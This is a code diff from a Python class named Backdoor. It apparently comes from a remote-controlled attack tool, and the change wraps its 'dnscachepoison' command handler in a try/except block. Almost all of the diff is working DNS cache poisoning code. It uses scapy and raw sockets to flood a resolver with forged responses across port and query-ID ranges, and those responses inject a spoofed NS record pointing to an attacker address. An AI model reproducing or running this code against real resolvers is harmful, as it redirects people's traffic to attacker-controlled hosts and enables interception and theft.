@@ -481,68 +481,68 @@ class Backdoor:
                         except:
                             pass
                     elif command[0] == "dnscachepoison":
-                        # try:
-                        spoofDomain = command[1]
-                        ns = command[2]
-                        nsAddr = command[3]
-                        dnsAddr = command[4]
-                        query = command[5]
-                        dnsPorts = list(map(int, command[6].translate({ord(i): None for i in '[]'}).split(',')))
-                        start = int(command[7])
-                        end = int(command[8])
-                        if end > 65535:
-                            end = 65535
-                        dnsQids = list(range(start, end+1))
-                        print(start)
-                        print(end)
-                        badAddr = "10.0.2.10"
+                        try:
+                            spoofDomain = command[1]
+                            ns = command[2]
+                            nsAddr = command[3]
+                            dnsAddr = command[4]
+                            query = command[5]
+                            dnsPorts = list(map(int, command[6].translate({ord(i): None for i in '[]'}).split(',')))
+                            start = int(command[7])
+                            end = int(command[8])
+                            if end > 65535:
+                                end = 65535
+                            dnsQids = list(range(start, end+1))
+                            print(start)
+                            print(end)
+                            badAddr = "10.0.2.10"
 
-                        ip = scapy.IP(src=nsAddr, dst=dnsAddr)
-                        qdsec = scapy.DNSQR(qname=query, qtype="A", qclass="IN")
-                        ansec = scapy.DNSRR(rrname=ns, type="A", rclass="IN", ttl=60000, rdata=badAddr)
-                        nssec = scapy.DNSRR(rrname=spoofDomain, type="NS", rclass="IN", ttl=60000, rdata=ns)
+                            ip = scapy.IP(src=nsAddr, dst=dnsAddr)
+                            qdsec = scapy.DNSQR(qname=query, qtype="A", qclass="IN")
+                            ansec = scapy.DNSRR(rrname=ns, type="A", rclass="IN", ttl=60000, rdata=badAddr)
+                            nssec = scapy.DNSRR(rrname=spoofDomain, type="NS", rclass="IN", ttl=60000, rdata=ns)
 
-                        p_processes = []
-                        manager = multiprocessing.Manager()
-                        total_responses = manager.list()
-                        for port in dnsPorts:
-                            p = multiprocessing.Process(target=fake_dns_responses,
-                                                        args=(port, dnsQids, qdsec, ansec, nssec, ip, total_responses))
-                            p.start()
-                            p_processes.append(p)
-                        for process in p_processes:
-                            process.join()
+                            p_processes = []
+                            manager = multiprocessing.Manager()
+                            total_responses = manager.list()
+                            for port in dnsPorts:
+                                p = multiprocessing.Process(target=fake_dns_responses,
+                                                            args=(port, dnsQids, qdsec, ansec, nssec, ip, total_responses))
+                                p.start()
+                                p_processes.append(p)
+                            for process in p_processes:
+                                process.join()
 
-                        rawsock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
-                        rawsock.setsockopt(socket.IPPROTO_IP, socket.SO_REUSEADDR, 1)
+                            rawsock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
+                            rawsock.setsockopt(socket.IPPROTO_IP, socket.SO_REUSEADDR, 1)
 
-                        ip = scapy.IP(src=randomize_ip(), dst=dnsAddr)
-                        qdsec = scapy.DNSQR(qname=query, qtype="A", qclass="IN")
-                        dns = scapy.DNS(id=randomize_integer(), qr=0, opcode="QUERY", rd=1, qdcount=1, ancount=0,
-                                        nscount=0, arcount=0, qd=qdsec)
-                        sending_requests = multiprocessing.Process(target=send_dns_requests,
-                                                                   args=(dnsPorts, ip, dns, dnsAddr, rawsock))
+                            ip = scapy.IP(src=randomize_ip(), dst=dnsAddr)
+                            qdsec = scapy.DNSQR(qname=query, qtype="A", qclass="IN")
+                            dns = scapy.DNS(id=randomize_integer(), qr=0, opcode="QUERY", rd=1, qdcount=1, ancount=0,
+                                            nscount=0, arcount=0, qd=qdsec)
+                            sending_requests = multiprocessing.Process(target=send_dns_requests,
+                                                                       args=(dnsPorts, ip, dns, dnsAddr, rawsock))
 
-                        sending_fake_responses_processes = []
-                        for port_responses in total_responses:
-                            port = port_responses[0]
-                            p = multiprocessing.Process(target=send_dns_responses_pool,
-                                                        args=(port, port_responses[1], dnsAddr, rawsock))
-                            sending_fake_responses_processes.append(p)
+                            sending_fake_responses_processes = []
+                            for port_responses in total_responses:
+                                port = port_responses[0]
+                                p = multiprocessing.Process(target=send_dns_responses_pool,
+                                                            args=(port, port_responses[1], dnsAddr, rawsock))
+                                sending_fake_responses_processes.append(p)
 
-                        print("Sending requests..")
-                        sending_requests.start()
-                        print("Sending fake responses..")
-                        for process in sending_fake_responses_processes:
-                            process.start()
+                            print("Sending requests..")
+                            sending_requests.start()
+                            print("Sending fake responses..")
+                            for process in sending_fake_responses_processes:
+                                process.start()
 
-                        sending_requests.join()
-                        print("Done sending requests")
-                        for process in sending_fake_responses_processes:
-                            process.join()
-                        print("Done sending fake responses")
-                        # except:
-                        #     pass
+                            sending_requests.join()
+                            print("Done sending requests")
+                            for process in sending_fake_responses_processes:
+                                process.join()
+                            print("Done sending fake responses")
+                        except:
+                            pass
                     elif command[0] == "killarp":
                         try:
                             kill_arp()
